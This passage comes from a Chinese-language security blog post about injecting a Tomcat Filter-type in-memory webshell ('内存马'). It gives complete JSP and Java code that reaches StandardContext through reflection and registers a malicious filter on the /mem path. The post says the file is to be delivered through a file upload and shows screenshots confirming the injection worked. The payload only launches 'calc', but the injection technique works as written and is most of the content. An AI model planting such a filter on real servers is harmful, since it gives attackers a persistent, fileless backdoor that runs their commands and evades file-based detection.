+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(80, 80, 92);">由前面</font><strong><font style="color:rgb(80, 80, 92);">Filter实例存储分析</font></strong><font style="color:rgb(80, 80, 92);">得知 </font><code>StandardContext</code><font style="color:rgb(80, 80, 92);"> Filter实例存放在filterConfigs、filterDefs、filterConfigs这三个变量里面，将fifter添加到这三个变量中即可将内存马打入。</font></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;cmdFilter&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">FilterDef</span> <span class="variable">def</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">def.setFilterName(filterName);</span><br><span class="line">def.setFilter(shellFilter);</span><br><span class="line">def.setFilterClass(shellFilter.getClass().getName());</span><br><span class="line"></span><br><span class="line"><span class="type">FilterMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">map.setFilterName(filterName);</span><br><span class="line">map.addURLPattern(<span class="string">&quot;/mem&quot;</span>);</span><br><span class="line"></span><br><span class="line">standardContext.addFilterDef(def);</span><br><span class="line">standardContext.addFilterMapBefore(map);</span><br><span class="line">standardContext.filterStart();</span><br><span class="line"></span><br><span class="line">out.println(<span class="string">&quot;success&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>将上述代码整理好后，写入网站上的一个jsp文件中（利用方式：文件上传）</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  <span class="title class_">Created</span> by <span class="title class_">IntelliJ</span> <span class="variable constant_">IDEA</span>.</span><br><span class="line">  <span class="title class_">User</span>: <span class="title class_">Andu1</span>n</span><br><span class="line">  <span class="title class_">Date</span>: <span class="number">2025</span>/<span class="number">2</span>/<span class="number">19</span></span><br><span class="line">  <span class="title class_">Time</span>: <span class="number">19</span>:<span class="number">33</span></span><br><span class="line">  <span class="title class_">To</span> change <span class="variable language_">this</span> template use <span class="title class_">File</span> | <span class="title class_">Settings</span> | <span class="title class_">File</span> <span class="title class_">Templates</span>.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.security.auth.login.ConfigurationSpi&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.ObjectInputFilter&quot;</span> %&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">&lt;%</span></span><br><span class="line"><span class="language-xml">  ServletContext servletContext = request.getSession().getServletContext();</span></span><br><span class="line"><span class="language-xml">  Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span></span><br><span class="line"><span class="language-xml">  appctx.setAccessible(true);</span></span><br><span class="line"><span class="language-xml">  ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">  Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span></span><br><span class="line"><span class="language-xml">  stdctx.setAccessible(true);</span></span><br><span class="line"><span class="language-xml">  StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">  Filter shellFilter = new Filter() &#123;</span></span><br><span class="line"><span class="language-xml">    @Override</span></span><br><span class="line"><span class="language-xml">    public void init(FilterConfig filterConfig) throws ServletException &#123;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    &#125;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    @Override</span></span><br><span class="line"><span class="language-xml">    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span></span><br><span class="line"><span class="language-xml">      Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line"><span class="language-xml">    &#125;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    @Override</span></span><br><span class="line"><span class="language-xml">    public void destroy() &#123;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    &#125;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">  &#125;;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">  String filterName = &quot;cmdFilter&quot;;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">  FilterDef def = new FilterDef();</span></span><br><span class="line"><span class="language-xml">  def.setFilterName(filterName);</span></span><br><span class="line"><span class="language-xml">  def.setFilter(shellFilter);</span></span><br><span class="line"><span class="language-xml">  def.setFilterClass(shellFilter.getClass().getName());</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">  FilterMap map = new FilterMap();</span></span><br><span class="line"><span class="language-xml">  map.setFilterName(filterName);</span></span><br><span class="line"><span class="language-xml">  map.addURLPattern(&quot;/mem&quot;);</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">  standardContext.addFilterDef(def);</span></span><br><span class="line"><span class="language-xml">  standardContext.addFilterMapBefore(map);</span></span><br><span class="line"><span class="language-xml">  standardContext.filterStart();</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">  out.println(&quot;success&quot;);</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">%&gt;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>启动tomcat服务，访问addFilter.jsp，执行我们的jsp代码</p>
+<p>回显success，说明我们前面的代码都已经执行成功，完成了内存马的注入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740024176570-94403153-3034-4c3f-9c3e-fe9b5dbb800c.png"></p>
+<p>后续访问我们设定好的内存马路径，成功执行代码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740024260413-8f70c49f-e9ef-4c05-96bd-98bebce1d826.png"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.jpg" alt="Sean 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay.jpg" alt="Sean 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/memShell/" rel="tag"># memShell</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/03/19/Servlet%E5%86%85%E5%AD%98%E9%A9%AC/" rel="prev" title="Servlet内存马">
+                  <i class="fa fa-angle-left"></i> Servlet内存马
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Sean</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
